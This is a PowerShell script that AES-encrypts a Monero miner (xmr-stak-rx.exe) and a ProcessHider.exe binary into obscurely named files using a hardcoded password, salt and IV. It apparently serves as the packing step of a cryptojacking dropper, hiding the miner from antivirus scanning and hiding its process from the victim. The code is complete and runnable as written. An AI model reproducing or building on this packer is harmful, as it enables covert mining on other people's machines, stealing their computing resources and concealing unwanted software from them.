function Encrypt-File {
    [CmdletBinding()]
    param (
      [byte[]] $Key,
      [byte[]] $Init,
      [string] $Path,
      [string] $Destination
    )
    $AES = [System.Security.Cryptography.AesManaged]::new()
    $AES.Key = $Key
    $AES.IV = $Init

    $Encryptor = $AES.CreateEncryptor()

    $FileStream = [System.IO.FileStream]::new($Path, [System.IO.FileMode]::OpenOrCreate)
    $FileWriter = [System.IO.File]::OpenWrite($Destination)

    $CryptoStream = [System.Security.Cryptography.CryptoStream]::new($FileWriter, $Encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)

    $FileStream.CopyTo($CryptoStream)

    $CryptoStream.Flush()
    $CryptoStream.FlushFinalBlock()
    $FileWriter.Flush()
    $CryptoStream.Clear()
    $FileWriter.Close()
    $FileStream.Close()
}

$Pass = [Text.Encoding]::UTF8.GetBytes("J4ck.Sp4rr0w")
$Salt = [Text.Encoding]::UTF8.GetBytes("1996")
$Init = [Text.Encoding]::UTF8.GetBytes("Yet another Pirate")

$Key = (new-Object Security.Cryptography.PasswordDeriveBytes $Pass, $Salt, "SHA256", 5).GetBytes(32)
$Init = (new-Object Security.Cryptography.SHA256Managed).ComputeHash($Init)[0..15]

$SourceFile = "./utils/xmr-stak/xmr-stak-rx.exe"
$DestinationFile = "./File0"
Encrypt-File -Path $SourceFile -Destination $DestinationFile -Key $Key -Init $Init

$SourceFile = "./utils/ProcessHider.exe"
$DestinationFile = "./File1"
Encrypt-File -Path $SourceFile -Destination $DestinationFile -Key $Key -Init $Init
